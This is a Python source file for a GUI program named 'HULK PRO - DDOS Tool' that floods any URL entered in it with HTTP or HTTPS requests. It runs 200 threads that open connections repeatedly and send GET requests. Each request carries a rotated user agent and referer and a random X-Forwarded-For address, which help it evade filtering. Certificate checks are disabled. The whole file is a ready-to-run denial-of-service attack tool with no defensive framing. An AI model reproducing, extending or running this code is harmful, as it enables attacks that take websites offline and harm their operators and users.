#!/usr/bin/env python3
from tkinter import *
from tkinter.ttk import *
from time import strftime
import sys
import os
import time
import socket
import random
import threading
import ssl
from datetime import datetime
from urllib.parse import urlparse

# Configuration
THREAD_COUNT = 200
TIMEOUT = 5
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
]
REFERERS = [
    'https://www.google.com/',
    'https://www.facebook.com/',
    'https://twitter.com/',
    'https://www.youtube.com/'
]

class HULKAttack:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        
    def random_ip(self):
        return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
    def create_http_request(self, host, path='/'):
        headers = [
            f"GET {path} HTTP/1.1",
            f"Host: {host}",
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Referer: {random.choice(REFERERS)}",
            "X-Forwarded-For: " + self.random_ip(),
            "Connection: keep-alive",
            "\r\n"
        ]
        return "\r\n".join(headers)
    
    def attack_thread(self, target_ip, target_port, is_https=False):
        while self.attack_running:
            try:
                if is_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(TIMEOUT)
                    ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
                    ssl_sock.connect((target_ip, target_port))
                    ssl_sock.send(self.create_http_request(target_ip).encode())
                    time.sleep(0.1)
                    ssl_sock.close()
                else:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(TIMEOUT)
                    sock.connect((target_ip, target_port))
                    sock.send(self.create_http_request(target_ip).encode())
                    time.sleep(0.1)
                    sock.close()
            except:
                pass
    
    def start_attack(self, target_ip, target_port, use_https=False):
        self.attack_running = True
        for _ in range(THREAD_COUNT):
            t = threading.Thread(target=self.attack_thread, args=(target_ip, target_port, use_https))
            t.daemon = True
            self.threads.append(t)
            t.start()
    
    def stop_attack(self):
        self.attack_running = False
        for t in self.threads:
            t.join()
        self.threads = []

class HULKGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("HULK PRO - DDOS Tool")
        self.root.geometry("400x300")
        self.root.resizable(0, 0)
        
        self.attack = HULKAttack()
        self.create_widgets()
    
    def create_widgets(self):
        # Clock
        self.clock_frame = Frame(self.root)
        self.clock_frame.pack(pady=10)
        
        self.lbl = Label(self.clock_frame, font=('calibri', 20, 'bold'),
                        background='purple', foreground='white')
        self.lbl.pack()
        self.update_time()
        
        # Target Input
        self.input_frame = Frame(self.root)
        self.input_frame.pack(pady=10)
        
        Label(self.input_frame, text="Target URL:").grid(row=0, column=0, sticky=W)
        self.target_entry = Entry(self.input_frame, width=30)
        self.target_entry.grid(row=0, column=1)
        self.target_entry.insert(0, "http://")
        
        # Attack Button
        self.btn_frame = Frame(self.root)
        self.btn_frame.pack(pady=20)
        
        self.attack_btn = Button(self.btn_frame, text="Start Attack", 
                               command=self.start_attack)
        self.attack_btn.pack(side=LEFT, padx=5)
        
        self.stop_btn = Button(self.btn_frame, text="Stop Attack",
                             command=self.stop_attack, state=DISABLED)
        self.stop_btn.pack(side=LEFT, padx=5)
        
        # Status
        self.status = Label(self.root, text="Ready", foreground="green")
        self.status.pack()
    
    def update_time(self):
        string = strftime('%H:%M:%S %p')
        self.lbl.config(text=string)
        self.lbl.after(1000, self.update_time)
    
    def validate_target(self, target):
        if not target.startswith(('http://', 'https://')):
            return False, "URL must start with http:// or https://"
        
        try:
            parsed = urlparse(target)
            if not parsed.netloc:
                return False, "Invalid URL format"
            
            host = parsed.netloc.split(':')[0]
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            return True, (host, port, parsed.scheme == 'https')
        except Exception as e:
            return False, str(e)
    
    def start_attack(self):
        target = self.target_entry.get()
        valid, result = self.validate_target(target)
        
        if not valid:
            self.status.config(text=f"Error: {result}", foreground="red")
            return
        
        host, port, is_https = result
        self.status.config(text=f"Attacking {host}:{port}...", foreground="orange")
        
        # Update UI
        self.attack_btn.config(state=DISABLED)
        self.stop_btn.config(state=NORMAL)
        self.target_entry.config(state=DISABLED)
        
        # Start attack in separate thread to prevent GUI freeze
        threading.Thread(target=self.attack.start_attack, 
                        args=(host, port, is_https), daemon=True).start()
    
    def stop_attack(self):
        self.attack.stop_attack()
        self.status.config(text="Attack stopped", foreground="green")
        
        # Reset UI
        self.attack_btn.config(state=NORMAL)
        self.stop_btn.config(state=DISABLED)
        self.target_entry.config(state=NORMAL)

if __name__ == "__main__":
    root = Tk()
    app = HULKGUI(root)
    root.mainloop()
